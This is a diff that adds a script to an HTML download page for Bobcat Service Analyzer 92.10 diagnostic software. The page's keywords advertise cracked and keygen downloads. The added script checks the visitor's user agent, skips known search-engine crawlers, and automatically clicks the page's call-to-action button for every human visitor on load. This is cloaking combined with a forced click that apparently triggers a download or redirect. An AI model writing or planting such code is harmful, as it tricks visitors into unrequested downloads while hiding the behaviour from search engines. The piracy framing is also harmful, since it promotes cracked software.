@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bobcat Service Analyzer 92.10 Development 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Bobcat Service Analyzer 92.10 Development 06.2024 for diagnostic and calibration of heavy equipment; multi-language support, 580MB size, Windows compatible.">
     <meta name="keywords" content="Bobcat Service Analyzer 92.10, Bobcat diagnostic tools, Bobcat software updates, Bobcat programming tool, Bobcat equipment diagnostics, Bobcat service log, Bobcat calibration software, Bobcat change SN options, Bobcat clear controller data, Bobcat drive pump calibration, Bobcat panel remote control, Bobcat system diagnostics, Bobcat interactive tests, Bobcat diagnostic screens, Bobcat software fixes updates, Bobcat Service Analyzer 92.10 Development 06.2024, Bobcat diagnostic software download, Bobcat diagnostic software free download, Bobcat diagnostic software keygen, Bobcat diagnostic software crack, Bobcat Service Analyzer 06.2024, Bobcat Service Analyzer 92.10 Development free download, Bobcat Service Analyzer 92.10 Development 2024, Bobcat diagnostic tool 2024, Bobcat 92.10 diagnostic download, Bobcat Heavy Equipment diagnostic software, Bobcat Heavy Equipment service log, Анализатор обслуживания Bobcat 92.10, Bobcat средство диагностики 92.10, Средство диагностики Bobcat бесплатная загрузка, Средство диагностики Bobcat скачать, Сервисный анализатор Bobcat скачать бесплатно, Анализатор обслуживания Bobcat скачать бесплатно, Bobcat Service Analyzer завантаження, Bobcat завантаження інструменту для діагностики, Bobcat Service Analyzer безкоштовно, Bobcat Service Analyzer скачать">
     <style>
